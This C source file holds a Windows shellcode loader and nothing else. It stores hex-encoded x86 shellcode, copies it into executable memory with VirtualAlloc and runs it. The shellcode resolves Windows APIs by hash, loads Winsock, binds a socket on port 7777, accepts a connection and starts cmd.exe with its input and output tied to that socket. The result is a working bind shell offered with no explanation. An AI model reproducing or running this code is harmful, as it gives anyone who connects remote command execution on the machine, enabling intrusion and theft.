#include <stdio.h>
#include <windows.h>

int main() {
    unsigned char mini[] =
        "\x31\xc0\x64\x8b\x58\x30\x8b\x5b\x0c\x8b\x5b\x0c\x8b\x1b\x8b\x1b\x8b\x43\x18\x89"
        "\xc6\x89\xc3\x83\xc6\x3c\x8b\x1e\x01\xc3\x8d\x5b\x78\x8b\x1b\x01\xc3\x55\x89\xe5"
        "\x31\xc9\x51\x50\x53\x8b\x73\x20\x01\xc6\x56\x31\xd2\x66\xb9\x0c\x00\x52\xe2\xfd"
        "\x54\x31\xc9\x31\xd2\x31\xc0\x68\x72\xfe\xb3\x16\x68\x7e\xd8\xe2\x73\x68\xdb\x4f"
        "\x3d\xc5\x68\x8e\x4e\x0e\xec\xb9\x04\x00\x00\x00\x8d\x1c\x24\x8b\x55\xf0\x51\xe8"
        "\x9f\x01\x00\x00\x59\x83\xc3\x04\x31\xf6\x31\xff\x8b\x75\xbc\x89\xf7\x89\x07\x83"
        "\xc6\x04\x89\x75\xbc\xe2\xe0\x31\xdb\x8b\x5d\xc0\x51\x68\x6c\x6c\x00\x00\x68\x33"
        "\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd3\x8b\x58\x3c\x89\xde\x01\xc3\x8d\x5b"
        "\x78\x8b\x1b\x01\xc3\x55\x89\xe5\x31\xc9\x51\x50\x53\x8b\x73\x20\x01\xc6\x56\x51"
        "\x51\x51\x51\x51\x54\x31\xc9\x31\xd2\x31\xc0\x68\xa4\x1a\x70\xc7\x68\xd9\x09\xf5"
        "\xad\x68\xcb\xed\xfc\x3b\x68\xa4\xad\x2e\xe9\x68\xe5\x49\x86\x49\xb9\x05\x00\x00"
        "\x00\x8d\x1c\x24\xeb\x00\x8b\x55\xf0\x51\xe8\x1c\x01\x00\x00\x59\x83\xc3\x04\x31"
        "\xf6\x31\xff\x8b\x75\xd8\x89\xf7\x89\x07\x83\xc6\x04\x89\x75\xd8\xe2\xe0\x31\xdb"
        "\x31\xc9\x31\xd2\x31\xd7\x31\xf6\x8b\x5d\xe8\x8b\x4d\xe4\x8b\x55\xe0\x8b\x7d\xdc"
        "\x89\xec\x5d\x89\x45\xd0\x89\x5d\xd4\x89\x4d\xd8\x89\x55\xdc\x89\x7d\xe0\x56\x83"
        "\xec\x20\x8b\x45\xd8\x54\x68\x02\x02\x00\x00\xff\xd0\x8b\x45\xd4\x31\xc9\x51\x51"
        "\x51\xb9\x06\x00\x00\x00\x51\xb9\x01\x00\x00\x00\x51\x41\x51\xff\xd0\x50\xb8\x02"
        "\x00\x00\x00\x83\xec\x10\x31\xc9\x89\x04\x24\x31\xf6\x66\xbe\x1e\x61\x66\x89\x74"
        "\x24\x02\x31\xff\x89\x7c\x24\x04\x89\x4c\x24\x08\x89\xe3\x8b\x55\xd0\x6a\x10\x53"
        "\x8b\x85\x74\xff\xff\xff\x50\x8b\x4d\xd0\xff\xd1\xb8\x06\x00\x00\x00\x50\x8b\xb5"
        "\x74\xff\xff\xff\x56\x8b\x5d\xdc\xff\xd3\x31\xc9\x51\x51\x8b\xb5\x74\xff\xff\xff"
        "\x56\x8b\x5d\xe0\xff\xd3\x89\xc6\x31\xdb\x31\xc9\x89\xca\x66\xb9\x54\x00\x52\xe2"
        "\xfd\x54\x5f\x31\xdb\x68\x65\x78\x65\x00\x68\x63\x6d\x64\x2e\x8d\x1c\x24\x31\xd2"
        "\x66\xba\x44\x00\x89\x17\x31\xc9\xb9\x00\x01\x00\x00\x89\x4f\x2c\xb9\x02\x00\x00"
        "\x00\x89\x4f\x30\x89\x47\x38\x89\x47\x3c\x89\x47\x40\x8d\x57\x44\x56\x31\xf6\x52"
        "\x57\x56\x56\x56\x46\x56\x31\xf6\x56\x56\x53\x56\x8b\x45\xcc\xff\xd0\x90\x90\x31"
        "\xc9\x31\xc0\x31\xf6\x41\x8b\x32\x83\xc2\x04\x03\x75\xf8\x31\xff\xac\x84\xc0\x74"
        "\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x3b\x75\xe5\x31\xff\x31\xf6\x8b\x7d\xf4\x8b"
        "\x77\x24\x03\x75\xf8\x49\x66\x8b\x0c\x4e\x8b\x77\x1c\x03\x75\xf8\x8b\x04\x8e\x03"
        "\x45\xf8\xc3";


    void* exec = VirtualAlloc(0, sizeof(mini), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        perror("VirtualAlloc");
        return 1;
    }

    memcpy(exec, mini, sizeof(mini));

    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
